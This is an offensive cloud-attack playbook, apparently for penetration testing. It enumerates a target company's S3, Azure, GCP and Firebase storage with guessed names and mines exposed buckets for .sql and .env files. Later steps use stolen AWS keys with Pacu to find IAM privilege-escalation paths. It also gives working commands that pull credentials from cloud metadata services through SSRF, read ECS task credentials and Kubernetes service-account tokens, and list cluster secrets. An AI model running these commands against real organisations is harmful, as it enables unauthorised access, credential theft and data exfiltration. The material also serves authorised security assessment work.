# Playbook: Cloud Asset Mapper

## Purpose
Enumerate and assess cloud storage assets (S3, Azure Blob, GCP Buckets) and
other cloud-native resources associated with the target.
Identify publicly accessible, misconfigured, or claimable cloud assets.
Input: domain name or company/org name.

---

## Step 1 — Derive Bucket Name Candidates

```bash
TARGET="targetcompany"  # base name without TLD

# Generate name variations
python3 -c "
base = '$TARGET'
variants = [
    base, base+'-prod', base+'-production', base+'-dev', base+'-development',
    base+'-stg', base+'-staging', base+'-test', base+'-qa', base+'-uat',
    base+'-backup', base+'-backups', base+'-data', base+'-assets',
    base+'-static', base+'-media', base+'-files', base+'-upload', base+'-uploads',
    base+'-logs', base+'-log', base+'-archive', base+'-archives',
    base+'-public', base+'-private', base+'-internal', base+'-secure',
    base+'-images', base+'-img', base+'-cdn', base+'-content',
    base+'-web', base+'-www', base+'-app', base+'-api', base+'-admin',
    base+'-config', base+'-configs', base+'-settings', base+'-env',
    base+'-deploy', base+'-release', base+'-build', base+'-builds',
    base+'-ci', base+'-cd', base+'-pipeline', base+'-reports',
    base+'-export', base+'-exports', base+'-import', base+'-imports',
    base+'-tmp', base+'-temp', base+'-cache',
    'prod-'+base, 'dev-'+base, 'stg-'+base, 'staging-'+base,
]
for v in variants:
    print(v)
" > bucket_candidates.txt

echo "Candidates generated: $(wc -l < bucket_candidates.txt)"
```

---

## Step 2 — Passive Discovery (No Noise)

```bash
# From JS files and wayback output (already collected)
grep -rhoiP "([a-z0-9_-]+\.s3\.amazonaws\.com|s3[.-][a-z0-9-]+\.amazonaws\.com\/[a-z0-9_-]+)" \
  js_files/ wayback_raw.txt 2>/dev/null | sort -u > s3_passive.txt

grep -rhoiP "[a-z0-9_-]+\.blob\.core\.windows\.net" \
  js_files/ wayback_raw.txt 2>/dev/null | sort -u > azure_passive.txt

grep -rhoiP "[a-z0-9_-]+\.storage\.googleapis\.com" \
  js_files/ wayback_raw.txt 2>/dev/null | sort -u > gcp_passive.txt

# From certificate transparency
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" \
  | python3 -c "
import sys, json
for e in json.load(sys.stdin):
    name = e.get('name_value','')
    if any(x in name for x in ['s3','blob','storage','bucket','cdn','assets','media']):
        print(name)
" | sort -u >> s3_passive.txt
```

---

## Step 3 — Active S3 Enumeration

```bash
# S3Scanner — checks existence AND access level
s3scanner scan --bucket-file bucket_candidates.txt \
  --out-file s3scan_results.txt \
  --threads 20

# Manual check for each candidate
while read bucket; do
  # Check if bucket exists
  status=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://${bucket}.s3.amazonaws.com/")

  case $status in
    200)  echo "[PUBLIC-LIST] $bucket" ;;    # Publicly listable!
    403)  echo "[EXISTS-PRIVATE] $bucket" ;; # Exists but private
    404)  echo "[NOT-FOUND] $bucket" ;;
    301)  echo "[REDIRECT] $bucket" ;;
  esac
done < bucket_candidates.txt > s3_active_results.txt

# Flag listable buckets
grep "PUBLIC-LIST" s3_active_results.txt > s3_public.txt
echo "Public listable S3 buckets: $(wc -l < s3_public.txt)"
```

---

## Step 4 — Azure Blob Storage

```bash
# Azure storage account name candidates (3-24 chars, lowercase alphanumeric only)
python3 -c "
import re
base = '$TARGET'.lower()
base = re.sub(r'[^a-z0-9]', '', base)[:20]
variants = [base, base+'prod', base+'dev', base+'stg', base+'data',
            base+'files', base+'media', base+'static', base+'backup',
            base+'assets', base+'logs', base+'archive']
for v in variants:
    if 3 <= len(v) <= 24:
        print(v)
" > azure_candidates.txt

# Common container names to test per account
CONTAINERS=("public" "private" "data" "files" "uploads" "media" "assets"
            "static" "backup" "backups" "logs" "archive" "config" "configs"
            "\$web" "images" "documents" "reports" "exports")

while read account; do
  # Check if storage account exists
  status=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://${account}.blob.core.windows.net/")

  if [ "$status" != "404" ]; then
    echo "[EXISTS] $account.blob.core.windows.net"
    # Check containers
    for container in "${CONTAINERS[@]}"; do
      cs=$(curl -sk -o /dev/null -w "%{http_code}" \
        "https://${account}.blob.core.windows.net/${container}?restype=container&comp=list")
      [ "$cs" = "200" ] && echo "  [PUBLIC] container: $container"
    done
  fi
done < azure_candidates.txt
```

---

## Step 5 — GCP Bucket Enumeration

```bash
while read bucket; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://storage.googleapis.com/${bucket}")

  case $status in
    200)  echo "[PUBLIC-LIST] $bucket" ;;
    403)  echo "[EXISTS-PRIVATE] $bucket" ;;
    404)  ;;  # Not found, skip
  esac
done < bucket_candidates.txt > gcp_results.txt
```

---

## Step 6 — Assess Accessible Buckets

For any bucket found to be public:

```bash
BUCKET="target-prod-uploads"

# List contents
aws s3 ls s3://$BUCKET/ --no-sign-request --recursive 2>/dev/null | head -100

# Check for sensitive files
aws s3 ls s3://$BUCKET/ --no-sign-request --recursive 2>/dev/null \
  | grep -iE "\.(sql|dump|db|env|config|cfg|ini|log|bak|backup|key|pem|cert|credentials|secret|password|token)" \
  > bucket_sensitive_files.txt

# Attempt write (DO NOT if not in scope — test only if write is explicitly allowed)
# echo "test" | aws s3 cp - s3://$BUCKET/test_write.txt --no-sign-request

# Check ACL
curl -sk "https://$BUCKET.s3.amazonaws.com/?acl" | grep -i "AllUsers\|AuthenticatedUsers"
```

---

## Step 7 — Firebase & Other Cloud Services

```bash
# Firebase Realtime Database
FIREBASE_URLS=("$TARGET" "${TARGET}-default-rtdb" "${TARGET}-prod")
for name in "${FIREBASE_URLS[@]}"; do
  url="https://${name}.firebaseio.com/.json"
  status=$(curl -sk -o /dev/null -w "%{http_code}" "$url")
  [ "$status" = "200" ] && echo "[FIREBASE PUBLIC] $url"
done

# Elasticsearch (often exposed on cloud VMs)
# (check from httpx tech-detect results)

# Kubernetes dashboard
# (check from httpx output — see httpx_triage framework)
```

---

## Step 8 — IAM Privilege Escalation Paths

Once you have any cloud credentials (from exposed .env, SSRF to metadata, etc.),
enumerate what those credentials can do and look for escalation paths.

```bash
# AWS — enumerate permissions of compromised credentials
# enumerate-iam: brute-forces API calls to determine permissions
python3 enumerate-iam.py \
  --access-key AKIA... \
  --secret-key ... \
  --region us-east-1

# Pacu — AWS exploitation framework
# Install: pip3 install pacu
pacu
> import_keys compromised
> run iam__enum_permissions
> run iam__privesc_scan

# Key escalation paths to check:
# 1. iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
#    → Create Lambda with admin role, invoke it to get admin creds
# 2. iam:PassRole + ec2:RunInstances
#    → Launch EC2 with admin instance profile
# 3. sts:AssumeRole
#    → Assume a more privileged role (check trust policies)
# 4. iam:CreatePolicyVersion
#    → Create new policy version with full admin, set as default
# 5. iam:AttachUserPolicy / iam:AttachRolePolicy
#    → Attach AdministratorAccess to self
# 6. lambda:UpdateFunctionCode + existing Lambda with privileged role
#    → Replace function code, invoke to steal role creds
# 7. iam:CreateLoginProfile / iam:UpdateLoginProfile
#    → Create console password for any IAM user

# Check for assumable roles
aws iam list-roles --query 'Roles[*].[RoleName,AssumeRolePolicyDocument]' \
  --output text 2>/dev/null

# Check instance profiles (for EC2 role abuse)
aws iam list-instance-profiles --query 'InstanceProfiles[*].[InstanceProfileName,Roles[0].RoleName]' \
  --output text 2>/dev/null
```

---

## Step 9 — IMDS Detection and Exploitation (IMDSv1 vs IMDSv2)

Instance Metadata Service is the primary target for SSRF-to-credential chains.

```bash
# IMDSv1 — simple GET request, no auth required
# If SSRF exists, this is the first thing to try
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get role name, then fetch temporary credentials
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

# IMDSv2 — requires a PUT request for a token first
# Most SSRF vulnerabilities cannot issue PUT requests, so IMDSv2 blocks them
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Detection: determine which IMDS version is enforced
# If IMDSv1 responds to a plain GET → v1 is enabled (vulnerable)
# If only PUT+token flow works → v2 only (harder to exploit via SSRF)
# Check via SSRF:
#   GET http://169.254.169.254/latest/meta-data/ → 200 = IMDSv1 active
#   GET http://169.254.169.254/latest/meta-data/ → 401 = IMDSv2 only

# Other useful metadata endpoints (IMDSv1):
curl -s http://169.254.169.254/latest/user-data          # startup scripts, may contain secrets
curl -s http://169.254.169.254/latest/meta-data/hostname
curl -s http://169.254.169.254/latest/meta-data/local-ipv4
curl -s http://169.254.169.254/latest/meta-data/public-keys/
```

---

## Step 10 — Cloud-Specific SSRF Targets

Each cloud provider has different metadata endpoints and header requirements.

### AWS

```bash
# No special headers required for IMDSv1
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
curl http://169.254.169.254/latest/user-data
```

### Azure

```bash
# Requires Metadata: true header
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Managed Identity token theft — gets an OAuth token for Azure services
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# The token can be used to call Azure Resource Manager API:
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# Azure also has a wireserver endpoint:
curl "http://168.63.129.16/machine?comp=goalstate"
```

### GCP

```bash
# Requires Metadata-Flavor: Google header
# Uses metadata.google.internal hostname (also 169.254.169.254)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/"

# Service account token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Service account email and scopes
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"

# Project-level metadata (may contain secrets in attributes)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/"

# Key difference from AWS: GCP blocks requests without the header,
# but some SSRF vulnerabilities allow custom header injection
```

### DigitalOcean

```bash
# No special headers required
curl http://169.254.169.254/metadata/v1/
curl http://169.254.169.254/metadata/v1/id
curl http://169.254.169.254/metadata/v1/user-data   # startup scripts
curl http://169.254.169.254/metadata/v1/dns/nameservers
```

---

## Step 11 — Container Metadata Services

Containers (ECS, EKS, GKE, AKS) have their own metadata endpoints
distinct from the VM-level IMDS.

### AWS ECS Task Metadata

```bash
# ECS tasks use a different endpoint — available via env var
# $ECS_CONTAINER_METADATA_URI_V4 (typically http://169.254.170.2/v4/...)
curl "$ECS_CONTAINER_METADATA_URI_V4"
curl "$ECS_CONTAINER_METADATA_URI_V4/task"
curl "$ECS_CONTAINER_METADATA_URI_V4/task" | jq '.Containers[].Networks'

# Task role credentials (different from EC2 instance profile)
curl http://169.254.170.2/v2/credentials/$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# Via SSRF — try both endpoints:
#   http://169.254.169.254/...   (EC2 host IMDS, if not blocked)
#   http://169.254.170.2/...     (ECS task metadata)
```

### Kubernetes Service Account Tokens

```bash
# Default service account token is mounted at a well-known path
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# If you have SSRF or file read, target these paths
# The token can be used to query the Kubernetes API:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets

# Check permissions of the service account
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'

# Common escalation: if the SA can list secrets, read configmaps,
# or create pods → full cluster compromise
```

### AWS EKS / GCP GKE / Azure AKS

```bash
# EKS: both IMDS and K8s SA token may be available
# GKE: metadata.google.internal + K8s SA token
# AKS: Azure IMDS (169.254.169.254 with Metadata: true) + K8s SA token

# GKE-specific: if workload identity is not configured,
# the node's GCP service account token is accessible via IMDS
# This often has broader permissions than intended for the pod
```

---

## Step 12 — Cloud Security Assessment Tools

```bash
# ScoutSuite — multi-cloud security auditing
# Requires credentials (from stolen creds, SSRF-extracted tokens, etc.)
# Supports AWS, Azure, GCP, Alibaba Cloud, Oracle Cloud
pip3 install scoutsuite
scout aws --profile compromised-profile
# Generates an HTML report with all misconfigurations

# Pacu — AWS exploitation framework
pip3 install pacu
pacu
> import_keys stolen
> run iam__enum_permissions
> run iam__privesc_scan
> run ec2__enum
> run s3__enum
> run lambda__enum

# enumerate-iam — fast permission enumeration
git clone https://github.com/andresriancho/enumerate-iam.git
cd enumerate-iam
pip3 install -r requirements.txt
python3 enumerate-iam.py --access-key AKIA... --secret-key ...

# cloud_enum — multi-cloud asset enumeration (S3, Azure, GCP)
pip3 install cloud_enum
cloud_enum -k targetcompany -k target-company \
  --disable-gcp --threads 20

# Other useful tools:
# - prowler: AWS/Azure/GCP security best practices checks
# - cloudfox: automating situational awareness in cloud environments
# - trufflehog: scan for leaked cloud credentials in repos
# - CloudBrute: cloud infrastructure brute-forcer (all providers)
```

---

## Output

```
TARGET          : targetcompany
─────────────────────────────────────────────────────
S3 BUCKETS
  Passive found : 3 (from JS/wayback)
  Active scanned: 47 name variants
  EXISTS private: 8
  PUBLIC LIST   : 2 ← CRITICAL
    - targetcompany-dev-uploads (47 files, 3 .sql dumps found)
    - targetcompany-backup (122 files, .env file found)
─────────────────────────────────────────────────────
AZURE BLOB
  Accounts found: 2
  Public containers: 0
─────────────────────────────────────────────────────
GCP BUCKETS
  Public list   : 0
  Exists private: 1
─────────────────────────────────────────────────────
NEXT STEPS:
  1. Download and review .sql, .env files from public buckets
  2. Check bucket ACL for write access
  3. Report public-list buckets as HIGH/CRITICAL depending on content
```
